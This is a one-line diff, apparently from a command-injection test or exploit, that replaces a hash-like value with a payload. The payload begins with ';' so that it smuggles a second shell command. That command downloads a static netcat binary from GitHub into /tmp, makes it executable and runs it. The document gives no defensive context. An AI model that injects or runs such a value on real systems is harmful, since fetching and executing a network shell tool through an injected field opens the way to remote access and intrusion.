@@ -1,1 +1,1 @@
-43098fa852bd0c26f6f0851c166f54ca
+; wget https://github.com/yunchih/static-binaries/raw/master/nc -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -V
